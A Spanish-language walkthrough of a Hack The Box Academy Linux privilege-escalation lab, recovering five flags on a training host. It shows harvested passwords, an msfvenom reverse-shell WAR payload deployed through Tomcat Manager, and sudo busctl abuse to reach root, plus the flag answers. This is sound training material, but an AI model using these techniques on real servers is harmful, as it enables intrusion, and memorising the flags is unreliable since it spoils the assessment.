
# Escalada en Linux - Skills Assesment

Nos han contratado para realizar una evaluación de fortalecimiento de la seguridad en uno de los servidores web públicos de la organización `INLANEFREIGHT`.

El cliente nos ha proporcionado un usuario con pocos privilegios para evaluar la seguridad del servidor. Conéctese a través de SSH y comience a buscar errores de configuración y otras fallas que puedan aumentar los privilegios utilizando las habilidades aprendidas en este módulo.

Una vez en el host, debemos encontrar `5 indicadores (flags)` en el host, a los que se pueda acceder en varios niveles de privilegio. Escalar los privilegios de usuario `htb-student` a usuario `root` y enviar los cinco indicadores para finalizar este módulo.

{% hint style="info" %}
Nota: Existe una manera de obtener un shell en la máquina en lugar de usar las credenciales SSH si desea que el escenario sea más desafiante. Esto es opcional y no otorga más puntos ni cuenta para completar la prueba.
{% endhint %}

***

```
SSH a 10.129.176.120 (ACADEMY-LLPE-SKILLS-NIX03)
User "htb-student"
Password "Academy_LLPE!"
```

## <mark style="color:purple;">Flag 1</mark>

```
Usuario: htb-student
```

Al acceder por SSH nos encontramos con el archivo de historial de la terminal que contiene una pista de la primera flag, pero parece que el archivo ya no está allí:

```shell-session
htb-student@nix03:~$ ls -la
total 32
drwxr-xr-x 4 htb-student htb-student 4096 Sep  6  2020 .
drwxr-xr-x 5 root        root        4096 Sep  6  2020 ..
-rw------- 1 htb-student htb-student   57 Sep  6  2020 .bash_history
-rw-r--r-- 1 htb-student htb-student  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 htb-student htb-student 3771 Feb 25  2020 .bashrc
drwx------ 2 htb-student htb-student 4096 Sep  6  2020 .cache
drwxr-xr-x 2 root        root        4096 Sep  6  2020 .config
-rw-r--r-- 1 htb-student htb-student  807 Feb 25  2020 .profile
htb-student@nix03:~$ cat .bash_history 
id
ls
ls /var/www/html
cat /var/www/html/flag1.txt 
exit
htb-student@nix03:~$ cat /var/www/html/flag1.txt 
cat: /var/www/html/flag1.txt: No such file or directory
```

En el directorio home encontramos `3 usuarios`:

```shell-session
htb-student@nix03:/$ cd home
htb-student@nix03:/home$ ls
barry  htb-student  mrb3n
```

Al enumerar archivos ocultos como `.config`, encontramos la flag 1:

```shell-session
htb-student@nix03:~$ ls -la ~/.config
total 12
drwxr-xr-x 2 root        root        4096 Sep  6  2020 .
drwxr-xr-x 4 htb-student htb-student 4096 Sep  6  2020 ..
-rw-r--r-- 1 htb-student www-data      33 Sep  6  2020 .flag1.txt
htb-student@nix03:~$ cat ~/.config/.flag1.txt 
LLPE{d0n_ov3rl00k_h1dd3n_f1l3s!}
```

El usuario `htb-student` no tiene permisos de ejecución en la máquina:

```shell-session
htb-student@nix03:~$ sudo -l
[sudo] password for htb-student: 
Sorry, user htb-student may not run sudo on nix03.
```

## <mark style="color:purple;">Flag 2</mark>

```
Usuario: barry
```

En el directorio /home/barry encontramos la flag 2, pero no podemos acceder directamente:

```shell-session
htb-student@nix03:/home/barry$ ls -la
total 40
drwxr-xr-x 5 barry barry 4096 Sep  5  2020 .
drwxr-xr-x 5 root  root  4096 Sep  6  2020 ..
-rwxr-xr-x 1 barry barry  360 Sep  6  2020 .bash_history
-rw-r--r-- 1 barry barry  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 barry barry 3771 Feb 25  2020 .bashrc
drwx------ 2 barry barry 4096 Sep  5  2020 .cache
-rwx------ 1 barry barry   29 Sep  5  2020 flag2.txt
drwxrwxr-x 3 barry barry 4096 Sep  5  2020 .local
-rw-r--r-- 1 barry barry  807 Feb 25  2020 .profile
drwx------ 2 barry barry 4096 Sep  5  2020 .ssh

htb-student@nix03:/home/barry$ cat flag2.txt 
cat: flag2.txt: Permission denied
```

Al leer el `.bash_history` nos encontramos algo interesante, unas credenciales:

```shell-session
htb-student@nix03:/home/barry$ cat .bash_history
cd /home/barry
ls
id
ssh-keygen
mysql -u root -p
tmux new -s barry
cd ~
sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
```

Probamos a cambiar al usuario Barry y buum! La contraseña sirve y leemos la flag 2:

```shell-session
htb-student@nix03:/home/barry$ su barry
Password: 
barry@nix03:~$ whoami
barry
barry@nix03:~$ ls
flag2.txt
barry@nix03:~$ cat flag2.txt 
LLPE{ch3ck_th0s3_cmd_l1n3s!}
```

El usuario `barry` no tiene permisos de ejecución en la máquina:

```shell-session
barry@nix03:~$ sudo -l
[sudo] password for barry: 
Sorry, user barry may not run sudo on nix03.
```

Comprobando la versión del Kernel nos encontramos con que es vulnerable:

```shell-session
barry@nix03:~$ uname -r
5.4.0-45-generic
```

## Flag 3

La flag 3 es bastante trivial, ya que usando el siguiente comando encontramos la flag y la leemos sin problema:

```shell-session
barry@nix03:~$ find / -name "*flag3*" 2>/dev/null
/var/log/flag3.txt

barry@nix03:~$ cat /var/log/flag3.txt
LLPE{h3y_l00k_a_fl@g!}
```

## Flag 4

De igual manera buscamos la flag 4, pero no podemos acceder directamente, necesitamos tener privilegios elevados:

```shell-session
barry@nix03:~$ find / -name "*flag4*" 2>/dev/null
/var/lib/tomcat9/flag4.txt

barry@nix03:~$ cat /var/lib/tomcat9/flag4.txt
cat: /var/lib/tomcat9/flag4.txt: Permission denied
```

No podemos tampoco cambiar los permisos, y solo podemos verlo con el usuario `tomcat`:

```shell-session
barry@nix03:/var/lib/tomcat9$ chmod 777 flag4.txt
chmod: changing permissions of 'flag4.txt': Operation not permitted
barry@nix03:/var/lib/tomcat9$ ls -la
total 24
drwxr-xr-x  5 root   root   4096 Nov 19 14:16 .
drwxr-xr-x 46 root   root   4096 Sep  3  2020 ..
lrwxrwxrwx  1 root   root     12 Feb 24  2020 conf -> /etc/tomcat9
-rw-------  1 tomcat tomcat   25 Sep  5  2020 flag4.txt
```

Vamos a ejecutar un linpeas para obtener un poco más de información. Encontramos algunas cosas interesantes:

```
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.31

Vulnerable to CVE-2021-3560

╔══════════╣ Users with console
barry:x:1001:1001::/home/barry:/bin/bash
htb-student:x:1002:1002::/home/htb-student:/bin/bash
mrb3n:x:1000:1000:Ben:/home/mrb3n:/bin/bash
root:x:0:0:root:/root:/bin/bash
tomcat:x:997:997:Apache Tomcat:/:/bin/bash

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)

╔══════════╣ Searching passwords in history files
/home/barry/.bash_history:ssh-keygen
/home/barry/.bash_history:mysql -u root -p
/home/barry/.bash_history:sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
```

Vemos que también hay un usuario tomcat, con el cual podríamos acceder con el Tomcat Manager desde la web, concretamente por el puerto 8080:

```bash
sudo nmap -v -sV 10.129.31.23 -T5

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open  http    Apache Tomcat
```

<figure><img src="/files/w5aWGQGCykxtXcrtaift" alt=""><figcaption></figcaption></figure>

Haciendo un poco de enumeración, en el directorio `/etc/tomcat9` encontramos un archivo `.bak` interesante, que contiene las credenciales del usuario `tomcatadm`:

<figure><img src="/files/XbASBYNh3l0G8RatyeAD" alt=""><figcaption></figcaption></figure>

```
<role rolename="manager-gui"/>
<role rolename="manager-script"/>
<role rolename="manager-jmx"/>
<role rolename="manager-status"/>
<role rolename="admin-gui"/>
<role rolename="admin-script"/>
<user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>
```

Vamos a usar estas credenciales para loguearnos en el host manager:

<figure><img src="/files/B7YCMogiFTTnCDyZqyU8" alt=""><figcaption></figcaption></figure>

Bingo! Ya estamos dentro. En el siguiente artículo encontramos un montón de información relevante para explotar un servidor Tomcat, concretamente vamos a subir un archivo .war malicioso que nos deveulva una reverse shell:

{% embed url="<https://null-byte.wonderhowto.com/how-to/hack-apache-tomcat-via-malicious-war-file-upload-0202593/>" %}

#### Creación de un .war malicioso

```
msfvenom -p java/shell_reverse_tcp lhost=10.10.14.103 lport=4444 -f war -o pwn.war
Payload size: 13027 bytes
Final size of war file: 13027 bytes
Saved as: pwn.war
```

#### Subida de .war malicioso

En List Applications bajamos hasta la parte de Deploy, y cargamos el .war malicioso, pero antes abrimos un listener con Netcat por el puerto que le hemos especificado:

<figure><img src="/files/Zx3WYaXvEuEM8fVJ0iUF" alt=""><figcaption></figcaption></figure>

Esto nos levanta el `.war`, y al hacer click sobre el nombre pwn nos devuelve la conexión reversa:

<figure><img src="/files/KNdXMw6QZ1Of0XwEIJRW" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/SeMOK3euoIKL00F0RFOp" alt=""><figcaption></figcaption></figure>

#### Tratamiento de la TTY

Entramos con una shell un poco restrictiva, así que vamos a hacer un tratamiento de la TTY para movernos mejor por el sistema:

```shell-session
tty
not a tty
python3 -c 'import pty; pty.spawn("/bin/bash")'   
tomcat@nix03:/var/lib/tomcat9$ export TERM=xterm   
export TERM=xterm
tomcat@nix03:/var/lib/tomcat9$ ls 
ls 
conf  flag4.txt  lib  logs  policy  webapps  work
tomcat@nix03:/var/lib/tomcat9$ cat flag4.txt    
cat flag4.txt
LLPE{Im_th3_m@n4g3r_n0w}
```

## Flag 5

Este usuario Tomcat tiene algunos permisos de ejecución en el sistema:

```shell-session
tomcat@nix03:/$ sudo -l
sudo -l
Matching Defaults entries for tomcat on nix03:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on nix03:
    (root) NOPASSWD: /usr/bin/busctl
```

El binario `busctl` es una herramienta que interactúa con el sistema D-Bus, lo cual puede explotarse para escalar privilegios, ya que permite comunicarse con servicios del sistema. En GTFOBins encontramos una guía de como elevar nuestros privilegios con busctl:

{% embed url="<https://gtfobins.github.io/gtfobins/busctl/>" %}

<figure><img src="/files/XPYi7MTA15s9ka5b4sQA" alt=""><figcaption></figcaption></figure>

Buum! Ya somos root, y nos hacemos con la última flag, concretamente en el directorio root:

```shell-session
# cd /root
cd /root
# ls
ls
flag5.txt  snap
# cat flag5.txt 
cat flag5.txt
LLPE{0ne_sUdo3r_t0_Ru13_th3m_@ll!}
```
